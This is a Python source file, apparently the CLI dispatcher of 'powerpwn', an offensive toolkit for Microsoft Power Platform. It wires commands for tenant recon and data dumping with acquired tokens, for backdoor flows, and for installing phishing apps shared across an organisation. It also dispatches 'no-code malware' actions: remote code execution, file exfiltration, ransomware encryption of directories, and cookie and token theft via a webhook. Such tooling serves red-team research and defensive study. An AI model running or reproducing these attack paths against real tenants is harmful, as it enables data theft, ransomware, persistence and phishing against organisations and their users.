import json
import logging
import os
import shutil

from powerpwn.cli.const import LOGGER_NAME
from powerpwn.nocodemalware.enums.code_exec_type_enum import CodeExecTypeEnum
from powerpwn.nocodemalware.enums.command_to_run_enum import CommandToRunEnum
from powerpwn.nocodemalware.malware_runner import MalwareRunner
from powerpwn.powerdoor.backdoor_flow import BackdoorFlow
from powerpwn.powerdoor.enums.action_type import BackdoorActionType
from powerpwn.powerdoor.flow_factory_installer import FlowFlowInstaller
from powerpwn.powerdump.collect.data_collectors.data_collector import DataCollector
from powerpwn.powerdump.collect.resources_collectors.resources_collector import ResourcesCollector
from powerpwn.powerdump.gui.gui import Gui
from powerpwn.powerdump.utils.auth import acquire_token, acquire_token_from_cached_refresh_token
from powerpwn.powerdump.utils.const import API_HUB_SCOPE, POWER_APPS_SCOPE
from powerpwn.powerphishing.app_installer import AppInstaller

logger = logging.getLogger(LOGGER_NAME)


def __init_command_token(args, scope: str) -> str:
    # if cached refresh token is found, use it
    if token := acquire_token_from_cached_refresh_token(scope, args.tenant):
        return token

    return acquire_token(scope=scope, tenant=args.tenant)


def run_recon_command(args):
    # cache
    if args.clear_cache:
        try:
            shutil.rmtree(args.cache_path)
        except FileNotFoundError:
            pass
    os.makedirs(args.cache_path, exist_ok=True)

    token = __init_command_token(args, POWER_APPS_SCOPE)

    entities_fetcher = ResourcesCollector(token=token, cache_path=args.cache_path)
    entities_fetcher.collect_and_cache()

    logger.info(f"Recon is completed in {args.cache_path}/resources")

    if args.gui:
        logger.info("Going to run local server for gui")
        run_gui_command(args)


def run_gui_command(args):
    Gui().run(cache_path=args.cache_path)


def run_dump_command(args):
    token = __init_command_token(args, API_HUB_SCOPE)
    is_data_collected = DataCollector(token=token, cache_path=args.cache_path).collect()
    if not is_data_collected:
        logger.info("No data dumped. Please run recon first.")
        return None

    logger.info(f"Dump is completed in {args.cache_path}/data")

    if args.gui:
        logger.info("Going to run local server for gui")
        run_gui_command(args)


def run_backdoor_flow_command(args):
    action_type = BackdoorActionType(args.backdoor_subcommand)
    if action_type == BackdoorActionType.delete_flow:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        backdoor_flow.delete_flow(args.environment_id, args.flow_id)

    elif action_type == BackdoorActionType.create_flow:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        backdoor_flow.create_flow_from_input_file(args.environment_id, args.input)

    elif action_type == BackdoorActionType.get_connections:
        backdoor_flow = BackdoorFlow(args.webhook_url)
        output_to_file = args.output and args.output != ""
        connections = backdoor_flow.get_connections(args.environment_id, not output_to_file)
        if output_to_file:
            f = open(args.output, "w+")
            f.write(json.dumps(connections, indent=4))
        else:
            logger.info(connections)

    elif action_type == BackdoorActionType.install_factory:
        token = __init_command_token(args, POWER_APPS_SCOPE)
        FlowFlowInstaller(token).install(args.environment_id, args.connection_id)


def run_nocodemalware_command(args):
    malware_runner = MalwareRunner(args.webhook_url)

    command_type = CommandToRunEnum(args.nocodemalware_subcommand)
    if command_type == CommandToRunEnum.CLEANUP:
        res = malware_runner.cleanup()
    elif command_type == CommandToRunEnum.CODE_EXEC:
        res = malware_runner.exec_command(args.command_to_execute, CodeExecTypeEnum(args.type))
    elif command_type == CommandToRunEnum.EXFILTRATION:
        res = malware_runner.exfiltrate(args.file)
    elif command_type == CommandToRunEnum.RANSOMWARE:
        res = malware_runner.ransomware(args.crawl_depth, args.dirs.split(","), args.encryption_key)
    elif command_type == CommandToRunEnum.STEAL_COOKIE:
        res = malware_runner.steal_cookie(args.cookie)
    elif command_type == CommandToRunEnum.STEAL_POWER_AUTOMATE_TOKEN:
        res = malware_runner.steal_power_automate_token()
    print(res)


def run_phishing_command(args):
    token = __init_command_token(args, POWER_APPS_SCOPE)
    app_installer = AppInstaller(token)
    if args.phishing_subcommand == "install-app":
        return app_installer.install_app(args.input, args.app_name, args.environment_id)
    elif args.phishing_subcommand == "share-app":
        return app_installer.share_app_with_org(args.app_id, args.environment_id, args.tenant)
    raise NotImplementedError("Phishing command has not been implemented yet.")
